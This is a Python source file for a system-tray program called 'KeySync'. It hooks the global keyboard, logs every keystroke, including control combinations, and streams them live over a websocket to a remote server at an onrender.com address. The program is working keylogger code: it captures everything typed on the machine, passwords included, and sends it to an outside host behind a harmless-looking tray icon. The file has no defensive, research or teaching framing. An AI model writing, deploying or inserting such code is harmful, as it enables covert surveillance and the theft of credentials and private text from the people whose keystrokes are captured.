# ← Primary client: System Tray + KB Hook + WS
import asyncio
import threading
import websockets
from pynput import keyboard
from pystray import Icon, MenuItem, Menu
from PIL import Image, ImageDraw
import queue
import sys

# =========================
# CONFIG
# =========================
URI = "wss://wan-data-t.onrender.com/ws"
running = True
message_queue = queue.Queue()

# =========================
# KEY CONVERTER
# =========================
ctrl_held = False
alt_held  = False

SPECIAL_KEYS = {
    keyboard.Key.enter:      "[Enter]",
    keyboard.Key.backspace:  "[Backspace]",
    keyboard.Key.delete:     "[Delete]",
    keyboard.Key.tab:        "[Tab]",
    keyboard.Key.esc:        "[Esc]",
    keyboard.Key.caps_lock:  "[CapsLock]",
    keyboard.Key.up:         "[↑]",
    keyboard.Key.down:       "[↓]",
    keyboard.Key.left:       "[←]",
    keyboard.Key.right:      "[→]",
    keyboard.Key.home:       "[Home]",
    keyboard.Key.end:        "[End]",
    keyboard.Key.page_up:    "[PageUp]",
    keyboard.Key.page_down:  "[PageDown]",
    keyboard.Key.insert:     "[Insert]",
    keyboard.Key.f1:  "[F1]",  keyboard.Key.f2:  "[F2]",
    keyboard.Key.f3:  "[F3]",  keyboard.Key.f4:  "[F4]",
    keyboard.Key.f5:  "[F5]",  keyboard.Key.f6:  "[F6]",
    keyboard.Key.f7:  "[F7]",  keyboard.Key.f8:  "[F8]",
    keyboard.Key.f9:  "[F9]",  keyboard.Key.f10: "[F10]",
    keyboard.Key.f11: "[F11]", keyboard.Key.f12: "[F12]",
}

def key_to_str(key):
    global ctrl_held, alt_held

    # Modifier tracking — return None (buffer এ যাবে না)
    if key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
        ctrl_held = True
        return None
    if key in (keyboard.Key.alt_l, keyboard.Key.alt_r, keyboard.Key.alt_gr):
        alt_held = True
        return None
    if key in (keyboard.Key.shift, keyboard.Key.shift_l, keyboard.Key.shift_r):
        return None

    # Printable character
    if hasattr(key, 'char') and key.char is not None:
        char = key.char
        # Ctrl+letter (Ctrl+A = \x01 ... Ctrl+Z = \x1a)
        if ctrl_held and ord(char) < 32:
            letter = chr(ord(char) + 64)
            prefix = "Ctrl+Alt+" if alt_held else "Ctrl+"
            return f"[{prefix}{letter}]"
        return char

    # Known special key
    if key in SPECIAL_KEYS:
        label = SPECIAL_KEYS[key]
        if ctrl_held:
            return f"[Ctrl+{label[1:]}"  # [Ctrl+Delete] etc
        return label

    # Unknown fallback
    return f"[{key}]"

# =========================
# KEYBOARD
# =========================
typed_buffer = ""

def on_press(key):
    global typed_buffer, running

    label = key_to_str(key)
    if label is None:
        return  # pure modifier, skip

    # Space → word flush, space নিজে send হবে না
    if key == keyboard.Key.space:
        if typed_buffer:
            message_queue.put(typed_buffer)
            typed_buffer = ""

    # Printable character → buffer এ জমাও
    elif hasattr(key, 'char') and key.char is not None and not ctrl_held:
        typed_buffer += label

    # Special key → instantly send
    else:
        if typed_buffer:
            message_queue.put(typed_buffer)
            typed_buffer = ""
        message_queue.put(label)

        if key == keyboard.Key.esc:
            running = False
            return False

def on_release(key):
    global ctrl_held, alt_held
    if key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
        ctrl_held = False
    if key in (keyboard.Key.alt_l, keyboard.Key.alt_r, keyboard.Key.alt_gr):
        alt_held = False

def start_keyboard_listener():
    with keyboard.Listener(
        on_press=on_press,
        on_release=on_release    # ← এটা আগে missing ছিল
    ) as listener:
        listener.join()

# =========================
# WEBSOCKET
# =========================
async def send_messages(websocket):
    global running
    while running:
        try:
            if not message_queue.empty():
                msg = message_queue.get()
                await websocket.send(msg)
                print("Sent:", msg)
            await asyncio.sleep(0.01)
        except:
            break

async def receive_messages(websocket):
    global running
    while running:
        try:
            message = await websocket.recv()
            print(f"\nFriend: {message}")
        except:
            break

async def websocket_client():
    global running
    try:
        async with websockets.connect(URI) as websocket:
            print("Connected")
            await asyncio.gather(
                send_messages(websocket),
                receive_messages(websocket)
            )
    except Exception as e:
        print("Connection Error:", e)

# =========================
# TRAY
# =========================
def create_image():
    image = Image.new("RGB", (64, 64), (40, 40, 40))
    draw = ImageDraw.Draw(image)
    draw.rectangle((18, 18, 46, 46), fill=(0, 255, 120))
    return image

def quit_app(icon):
    global running
    running = False
    icon.stop()
    print("Exiting...")
    sys.exit()

def start_tray():
    icon = Icon(
        "KeySync",
        create_image(),
        menu=Menu(MenuItem("Exit", quit_app))
    )
    icon.run()

# =========================
# MAIN
# =========================
if __name__ == "__main__":
    threading.Thread(
        target=lambda: asyncio.run(websocket_client()),
        daemon=True
    ).start()

    threading.Thread(
        target=start_keyboard_listener,
        daemon=True
    ).start()

    start_tray()